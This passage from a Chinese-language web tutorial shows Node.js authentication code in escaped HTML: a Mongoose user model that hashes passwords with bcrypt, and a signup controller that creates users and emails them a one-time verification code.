&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;userSchema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;pre&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;save&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;kd&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;!&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isModified&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;bcrypt&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;hash&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kc&#34;&gt;undefined&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 保存前移除passwordConfirm
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;mongoose&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;model&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;User&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;userSchema&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;module&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h3 id=&#34;认证控制器&#34;&gt;认证控制器
&lt;/h3&gt;&lt;p&gt;现在，您可以创建管理用户认证过程的逻辑。此认证逻辑包括注册、登录(登录)、OTP等。&lt;/p&gt;
&lt;p&gt;为此，首先转到您的controller文件夹并创建一个新文件。称之为authController.js，因为它处理项目的认证流程。&lt;/p&gt;
&lt;p&gt;创建文件后，您将创建注册函数。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;//import
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../model/userModel&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/appError&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/catchAsync&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generateOtp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/generateOtp&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;jwt&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;jsonwebtoken&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendEmail&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;../utils/email&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;exports&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;signup&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;catchAsync&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kr&#34;&gt;async&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;req&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;existingUser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findOne&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;existingUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;电子邮件已注册&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;400&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;));&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;generateOtp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;otpExpires&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;now&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;24&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;60&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;1000&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// OTP将过期的时间(1天)
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;kr&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;newUser&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;create&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;username&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;password&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;passwordConfirm&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;otpExpires&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;c1&#34;&gt;//配置电子邮件发送功能
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;sendEmail&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;({&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;newUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;email&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;subject&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;电子邮件验证的OTP&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;sb&#34;&gt;`&amp;lt;h1&amp;gt;您的OTP是: &lt;/span&gt;&lt;span class=&#34;si&#34;&gt;${&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;otp&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;}&lt;/span&gt;&lt;span class=&#34;sb&#34;&gt;&amp;lt;/h1&amp;gt;`&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;createSendToken&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;newUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;200&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;res&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;注册成功&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;catch&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;发送电子邮件错误:&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;error&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;kr&#34;&gt;await&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;User&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;findByIdAndDelete&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;newUser&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;next&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;      &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;AppError&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;发送电子邮件时出错。请重试&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;500&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;  &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
